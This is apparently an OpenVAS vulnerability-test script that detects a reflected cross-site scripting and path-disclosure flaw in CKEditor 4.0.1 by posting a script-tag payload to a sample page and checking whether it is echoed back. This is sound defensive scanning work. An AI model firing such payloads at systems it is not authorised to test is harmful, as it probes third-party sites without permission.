###############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_ckeditor_mult_vuln.nasl 11865 2018-10-12 10:03:43Z cfischer $
#
# CKEditor Multiple Vulnerabilities
#
# Authors:
# Thanga Prakash S <tprakash@secpod.com>
#
# Copyright:
# Copyright (c) 2013 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:ckeditor:ckeditor";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.903302");
  script_version("$Revision: 11865 $");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_tag(name:"last_modification", value:"$Date: 2018-10-12 12:03:43 +0200 (Fri, 12 Oct 2018) $");
  script_tag(name:"creation_date", value:"2013-02-26 18:00:48 +0530 (Tue, 26 Feb 2013)");
  script_name("CKEditor Multiple Vulnerabilities");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (c) 2013 SecPod");
  script_family("Web application abuses");
  script_dependencies("sw_ckeditor_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("ckeditor/installed");

  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/24530");
  script_xref(name:"URL", value:"http://packetstormsecurity.com/files/120387");
  script_xref(name:"URL", value:"http://ckeditor.com/release/CKEditor-4.0.1.1");

  script_tag(name:"impact", value:"Successful exploitation will allow attacker to execute arbitrary HTML and
  script code in a user's browser session in context of an affected site and
  results in loss of confidentiality.");
  script_tag(name:"affected", value:"CKEditor Version 4.0.1");
  script_tag(name:"insight", value:"Input passed via POST parameters to /ckeditor/samples/sample_posteddata.php
  is not properly sanitized before being returned to the user.");
  script_tag(name:"solution", value:"Update to CKEditor Version 4.0.1.1 or later.");
  script_tag(name:"summary", value:"This host is installed with CKEditor and is prone to multiple
  vulnerabilities.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_app");

  script_xref(name:"URL", value:"http://ckeditor.com/download");
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if( ! port = get_app_port( cpe:CPE ) ) exit( 0 );
if( ! dir = get_app_location( cpe:CPE, port:port ) ) exit( 0 );

if( dir == "/" ) dir = "";

host = http_host_name( port:port );

url = dir + '/samples/sample_posteddata.php';

postData = "<script>alert('XSS-Test')</script>[]=PATH DISCLOSURE";

req = string( "POST ", url, " HTTP/1.1\r\n",
              "Host: ", host, "\r\n",
              "Content-Type: application/x-www-form-urlencoded\r\n",
              "Content-Length: ", strlen(postData), "\r\n",
              "\r\n", postData );
res = http_keepalive_send_recv( port:port, data:req);

if(res =~ "HTTP/1\.. 200" && "<script>alert('XSS-Test')</script>" >< res && "ckeditor.com" >< res ) {
  report = report_vuln_url( port:port, url:url );
  security_message( port:port, data:report );
  exit( 0 );
}

exit( 99 );
